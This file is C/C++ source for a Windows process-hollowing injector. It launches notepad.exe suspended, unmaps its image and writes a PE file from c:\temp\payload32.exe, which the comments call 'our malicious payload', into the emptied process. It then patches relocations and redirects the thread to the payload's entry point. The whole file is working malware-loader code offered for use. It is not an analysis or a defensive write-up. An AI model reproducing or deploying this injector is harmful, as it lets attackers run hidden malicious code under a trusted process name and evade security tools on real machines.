#include <Windows.h>
#include <stdio.h>
#include "CWLInc.h"
#pragma comment(lib,"ntdll.lib")

typedef NTSYSAPI NTSTATUS(NTAPI* _ZwUnmapViewOfSection)(
	HANDLE ProcessHandle,
	PVOID  BaseAddress
	);


typedef NTSYSAPI NTSTATUS(NTAPI* _NtQueryInformationProcess)(
	IN HANDLE ProcessHandle,
	IN PROCESSINFOCLASS ProcessInformationClass,
	OUT PVOID ProcessInformation,
	IN ULONG ProcessInformationLength,
	OUT PULONG ReturnLength OPTIONAL);


typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;


void xMemCpy(void* dst, const void* src, size_t n) {
	const char* xSrc = (const char*)src;
	char* xDest = (char*)dst;
	if ((xDest != NULL) && (xSrc != NULL))
	{
		while (n) //till n
		{
			//Copy byte by byte
			*(xDest++) = *(xSrc++);
			--n;
		}
	}
}

void FixRelocation(HANDLE tpHandle, LPVOID payloadBytesBuffer, PIMAGE_NT_HEADERS payloadNTHeaders, PIMAGE_SECTION_HEADER payloadImageSection, LPVOID targetImageBase, DWORD deltaBase) {
	// Relocation and patching the binary
	IMAGE_DATA_DIRECTORY relocTable = (IMAGE_DATA_DIRECTORY)payloadNTHeaders->OptionalHeader.DataDirectory[5]; // IMAGE_DIRECTORY_ENTRY_BASERELOC
	//payloadImageSection = oldImageSection;

	for (int i = 0; i < payloadNTHeaders->FileHeader.NumberOfSections; i++) {
		BYTE* sectionName = (BYTE*)".reloc";
		if (memcmp(&payloadImageSection->Name, sectionName, 5) != 0) {
			payloadImageSection++;
			continue;
		}
		DWORD payloadRawData = payloadImageSection->PointerToRawData;
		DWORD relocOffset = 0;
		DWORD bytesRead = 0;
		SIZE_T* pBytesRead = 0;
		while (relocOffset < relocTable.Size) {
			PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)((DWORD)payloadBytesBuffer + payloadRawData + relocOffset);
			relocOffset += sizeof(BASE_RELOCATION_BLOCK);
			// To get number of entries we substract block size with size of structure BASE_RELOCATION_BLOCK (8)
			// let's say block size is 140: 0x140 - 0x8 = 0x132
			// then we divide this with the size of structure BASE_RELOCATION_ENTRY (2)
			// beacuse each entries are size of 2 byte i.e, 0x132 / 0x2 = 0x99 (153)
			// This means it's required to fix 0x99 virtual address in code
			DWORD relocEntryCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
			PBASE_RELOCATION_ENTRY relocEntries = (PBASE_RELOCATION_ENTRY)((DWORD)payloadBytesBuffer + payloadRawData + relocOffset);

			for (DWORD x = 0; x < relocEntryCount; x++) {
				relocOffset += sizeof(BASE_RELOCATION_ENTRY);
				if (relocEntries[x].Type == 0) {
					continue;
				}
				DWORD relocationRVA = relocationBlock->PageAddress + relocEntries[x].Offset;
				DWORD addressToPatch = 0;
				ReadProcessMemory(tpHandle, (LPCVOID)((DWORD)targetImageBase + relocationRVA), &addressToPatch, sizeof(DWORD), &bytesRead);
				addressToPatch += deltaBase;
				WriteProcessMemory(tpHandle, (PVOID)((DWORD)targetImageBase + relocationRVA), &addressToPatch, sizeof(DWORD), pBytesRead);
			}
		}
	}
}


int main() {
	_NtQueryInformationProcess pNtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
	if (pNtQueryInformationProcess == NULL) {
		perror("[-] Error NtQueryInformationProcess not found\n");
		exit(-1);
	}
	// Create a process in suspended mode with CreateProcessA
	LPSTARTUPINFOA startInfo = new STARTUPINFOA();
	LPPROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();
	PROCESS_BASIC_INFORMATION* procBasicInfo = new PROCESS_BASIC_INFORMATION();
	HANDLE hPayload = NULL;
	DWORD payloadFileSize = 0;
	
	printf("[+] Opening Process notepad.exe in suspended mode... \n");
	// You can change the address of the target process here
	LPSTR procName = (LPSTR)"c:\\windows\\syswow64\\notepad.exe";
	if (!CreateProcessA(NULL, procName, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, startInfo, procInfo)) {
		perror("[-] Error Creating Process\n");
		exit(-1);
	}
	printf("[+] Process Created In Suspended Mode... \n");

	// Getting Target Process Handle
	HANDLE tpHandle = procInfo->hProcess;
	DWORD retLen = 0;
	// Getting Target Base offset Address
	pNtQueryInformationProcess(tpHandle, ProcessBasicInformation, procBasicInfo, sizeof(PROCESS_BASIC_INFORMATION), &retLen);
	DWORD pebImageBaseOffset = (DWORD)procBasicInfo->PebBaseAddress + 8;
	printf("[+] Target Process Image Base Offset: %p \n", pebImageBaseOffset);
	// Getting Target ImageBase Addresss
	LPVOID targetImageBase = 0;
	SIZE_T bytesRead = 0;
	if (!ReadProcessMemory(tpHandle, (LPCVOID)pebImageBaseOffset, &targetImageBase, 4, &bytesRead)) {
		int lastError = GetLastError();
		perror("[-] Error Reading Target ImageBaseAddresss\n");
		exit(-1);
	}
	printf("[+] Target Process Image Base: %p \n", targetImageBase);

	// Getting Handle to our malicious payload
			// you can change the payload address here
	hPayload = CreateFileA("c:\\temp\\payload32.exe", GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
	if (hPayload == INVALID_HANDLE_VALUE) {
		perror("[-] Error Opening Malicious DLL\n");
		exit(-1);
	}
	payloadFileSize = GetFileSize(hPayload, NULL);
	// DWORD bytesRead = 0;
	// Writing our malicious payload into the memory
	LPVOID payloadBytesBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, payloadFileSize);
	printf("[+] Allocated memory for payload in current process: %p\n", payloadBytesBuffer);
	ReadFile(hPayload, payloadBytesBuffer, payloadFileSize, &bytesRead, NULL);

	// Parsing PE and getting image size
	PIMAGE_DOS_HEADER payloadDOSHeader = (PIMAGE_DOS_HEADER)payloadBytesBuffer;
	PIMAGE_NT_HEADERS payloadNTHeaders = (PIMAGE_NT_HEADERS)((DWORD)payloadBytesBuffer + payloadDOSHeader->e_lfanew);
	SIZE_T imageSize = (DWORD)payloadNTHeaders->OptionalHeader.SizeOfImage;

	// Hollow the target processs
	_ZwUnmapViewOfSection pZwUnmapViewOfSection = (_ZwUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "ZwUnmapViewOfSection");
	if (pZwUnmapViewOfSection == NULL) {
		perror("[-] Error ZwUnmapViewOfSection not found\n");
		exit(-1);
	}
	pZwUnmapViewOfSection(tpHandle, targetImageBase);
	printf("[+] Successfully Unmaped the section... \n");


	// Allocating new memory in target processs
	LPVOID newTargetImageBase = VirtualAllocEx(tpHandle, targetImageBase, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	targetImageBase = newTargetImageBase;
	printf("[+] Target Process New Image Base: %p \n", targetImageBase);
	// getting delta between payload image base address and the remote process image base address
	DWORD deltaBase = (DWORD)targetImageBase - payloadNTHeaders->OptionalHeader.ImageBase;


	// seting the source imagebase address to targetimage base and copying the payload image headers to the target image address
	payloadNTHeaders->OptionalHeader.ImageBase = (DWORD)targetImageBase;
	WriteProcessMemory(tpHandle, targetImageBase, payloadBytesBuffer, payloadNTHeaders->OptionalHeader.SizeOfHeaders, NULL);

	// copy all the sections from the payload to the target process
	PIMAGE_SECTION_HEADER payloadImageSection = (PIMAGE_SECTION_HEADER)((DWORD)payloadBytesBuffer + 
													payloadDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS32));
	PIMAGE_SECTION_HEADER oldImageSection = payloadImageSection;

	for (int i = 0; i < payloadNTHeaders->FileHeader.NumberOfSections; i++) {
		PVOID targetSectionLocation = (PVOID)((DWORD)targetImageBase + payloadImageSection->VirtualAddress);
		PVOID payloadSectionLocation = (PVOID)((DWORD)payloadBytesBuffer + payloadImageSection->PointerToRawData);
		WriteProcessMemory(tpHandle, targetSectionLocation, payloadSectionLocation, payloadImageSection->SizeOfRawData, NULL);
		payloadImageSection++;
	}
	payloadImageSection = oldImageSection;
	// Relocation and patching the binary
	FixRelocation(tpHandle, payloadBytesBuffer, payloadNTHeaders, payloadImageSection, targetImageBase, deltaBase);

	DWORD entryPoint = (DWORD)targetImageBase + payloadNTHeaders->OptionalHeader.AddressOfEntryPoint;
	LPCONTEXT pContext = new CONTEXT();
	pContext->ContextFlags = CONTEXT_INTEGER;
	printf("[+] Getting Thread Context...\n");
	if (!GetThreadContext(procInfo->hThread, pContext)) {
		perror("[-] Error Getting Thread Context... \n");
		exit(-1);
	}
	printf("[+] Setting Thread Context...\n");
	// changing the control flow by resetting the entrypoint
	pContext->Eax = entryPoint;
	if (!SetThreadContext(procInfo->hThread, pContext)) {
		perror("[-] Error Setting Thread Context... \n");
		exit(-1);
	}
	printf("[+] Resume Thread...\n");
	ResumeThread(procInfo->hThread);
}

